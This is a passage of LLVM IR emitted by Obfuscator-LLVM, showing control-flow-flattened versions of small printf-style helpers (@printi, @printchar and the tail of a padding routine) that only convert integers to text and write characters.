  %50 = select i1 %49, i32 -693330949, i32 -269898072
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 846328277, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = icmp sgt i32 %53, 0
  %55 = select i1 %54, i32 649320551, i32 -2091659072
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8**, i8*** %5, align 8
  %58 = load i32, i32* %10, align 4
  call void @printchar(i8** %57, i32 %58)
  %59 = load i32, i32* %9, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %9, align 4
  store i32 494210937, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %7, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %7, align 4
  store i32 846328277, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 -693330949, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 1199667868, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %6, align 8
  %68 = load i8, i8* %67, align 1
  %69 = icmp ne i8 %68, 0
  %70 = select i1 %69, i32 1258690099, i32 -1385688322
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i8**, i8*** %5, align 8
  %73 = load i8*, i8** %6, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  call void @printchar(i8** %72, i32 %75)
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %9, align 4
  store i32 -1212065483, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %6, align 8
  %80 = getelementptr inbounds i8, i8* %79, i32 1
  store i8* %80, i8** %6, align 8
  store i32 1199667868, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 293551496, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %7, align 4
  %84 = icmp sgt i32 %83, 0
  %85 = select i1 %84, i32 -638246056, i32 -554426172
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i8**, i8*** %5, align 8
  %88 = load i32, i32* %10, align 4
  call void @printchar(i8** %87, i32 %88)
  %89 = load i32, i32* %9, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %9, align 4
  store i32 -1936500475, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  store i32 293551496, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %9, align 4
  ret i32 %95

loopEnd:                                          ; preds = %91, %86, %82, %81, %78, %71, %66, %65, %64, %61, %56, %52, %51, %46, %45, %44, %39, %35, %34, %29, %26, %23, %18, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem = alloca i32
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  store i32 %23, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 837695684, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 837695684, label %first
    i32 127030193, label %26
    i32 1287797478, label %34
    i32 -951900107, label %38
    i32 -485267645, label %42
    i32 1125534132, label %46
    i32 -2127693274, label %49
    i32 404462269, label %54
    i32 1865929678, label %58
    i32 960516248, label %65
    i32 2137207921, label %71
    i32 1841883813, label %80
    i32 2117764951, label %84
    i32 -1739604054, label %88
    i32 1482149629, label %93
    i32 32379565, label %99
    i32 -2085971407, label %102
    i32 1457518718, label %103
    i32 -1884896324, label %111
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %24 = icmp eq i32 %.reload, 0
  %25 = select i1 %24, i32 127030193, i32 1287797478
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %27, align 1
  %28 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %28, align 1
  %29 = load i8**, i8*** %9, align 8
  %30 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %31 = load i32, i32* %13, align 4
  %32 = load i32, i32* %14, align 4
  %33 = call i32 @prints(i8** %29, i8* %30, i32 %31, i32 %32)
  store i32 %33, i32* %8, align 4
  store i32 -1884896324, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i32, i32* %12, align 4
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 -951900107, i32 -2127693274
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = icmp eq i32 %39, 10
  %41 = select i1 %40, i32 -485267645, i32 -2127693274
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = icmp slt i32 %43, 0
  %45 = select i1 %44, i32 1125534132, i32 -2127693274
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1, i32* %19, align 4
  %47 = load i32, i32* %10, align 4
  %48 = sub nsw i32 0, %47
  store i32 %48, i32* %21, align 4
  store i32 -2127693274, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %51 = getelementptr inbounds i8, i8* %50, i64 12
  %52 = getelementptr inbounds i8, i8* %51, i64 -1
  store i8* %52, i8** %17, align 8
  %53 = load i8*, i8** %17, align 8
  store i8 0, i8* %53, align 1
  store i32 404462269, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %21, align 4
  %56 = icmp ne i32 %55, 0
  %57 = select i1 %56, i32 1865929678, i32 1841883813
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %21, align 4
  %60 = load i32, i32* %11, align 4
  %61 = urem i32 %59, %60
  store i32 %61, i32* %18, align 4
  %62 = load i32, i32* %18, align 4
  %63 = icmp sge i32 %62, 10
  %64 = select i1 %63, i32 960516248, i32 2137207921
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %15, align 4
  %67 = sub nsw i32 %66, 48
  %68 = sub nsw i32 %67, 10
  %69 = load i32, i32* %18, align 4
  %70 = add nsw i32 %69, %68
  store i32 %70, i32* %18, align 4
  store i32 2137207921, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %18, align 4
  %73 = add nsw i32 %72, 48
  %74 = trunc i32 %73 to i8
  %75 = load i8*, i8** %17, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 -1
  store i8* %76, i8** %17, align 8
  store i8 %74, i8* %76, align 1
  %77 = load i32, i32* %11, align 4
  %78 = load i32, i32* %21, align 4
  %79 = udiv i32 %78, %77
  store i32 %79, i32* %21, align 4
  store i32 404462269, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %19, align 4
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 2117764951, i32 1457518718
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = icmp ne i32 %85, 0
  %87 = select i1 %86, i32 -1739604054, i32 32379565
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %14, align 4
  %90 = and i32 %89, 2
  %91 = icmp ne i32 %90, 0
  %92 = select i1 %91, i32 1482149629, i32 32379565
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %94, i32 45)
  %95 = load i32, i32* %20, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %20, align 4
  %97 = load i32, i32* %13, align 4
  %98 = add nsw i32 %97, -1
  store i32 %98, i32* %13, align 4
  store i32 -2085971407, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 -1
  store i8* %101, i8** %17, align 8
  store i8 45, i8* %101, align 1
  store i32 -2085971407, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  store i32 1457518718, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32, i32* %20, align 4
  %105 = load i8**, i8*** %9, align 8
  %106 = load i8*, i8** %17, align 8
  %107 = load i32, i32* %13, align 4
  %108 = load i32, i32* %14, align 4
  %109 = call i32 @prints(i8** %105, i8* %106, i32 %107, i32 %108)
  %110 = add nsw i32 %104, %109
  store i32 %110, i32* %8, align 4
  store i32 -1884896324, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %8, align 4
  ret i32 %112

loopEnd:                                          ; preds = %103, %102, %99, %93, %88, %84, %80, %71, %65, %58, %54, %49, %46, %42, %38, %34, %26, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %.reg2mem = alloca i8**
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  store i8** %5, i8*** %.reg2mem
  %switchVar = alloca i32
  store i32 -1205825773, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1205825773, label %first
    i32 2038711586, label %8
    i32 172827427, label %16
    i32 -1761714743, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8**, i8*** %.reg2mem
  %6 = icmp ne i8** %.reload, null
  %7 = select i1 %6, i32 2038711586, i32 172827427
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %4, align 4
  %10 = trunc i32 %9 to i8
  %11 = load i8**, i8*** %3, align 8
  %12 = load i8*, i8** %11, align 8
  store i8 %10, i8* %12, align 1
  %13 = load i8**, i8*** %3, align 8
  %14 = load i8*, i8** %13, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %13, align 8
  store i32 -1761714743, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = bitcast i32* %4 to i8*
  %18 = call i64 @write(i32 1, i8* %17, i64 1)
  store i32 -1761714743, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %8, %first, %switchDefault
  br label %loopEntry
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn nounwind }
attributes #12 = { noreturn }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146540370}
!2 = !{i32 -2146539679}
!3 = !{i32 -2146538930}
!4 = !{i32 -2146538220}
!5 = !{i32 -2146537402}
!6 = !{i32 -2146536511}
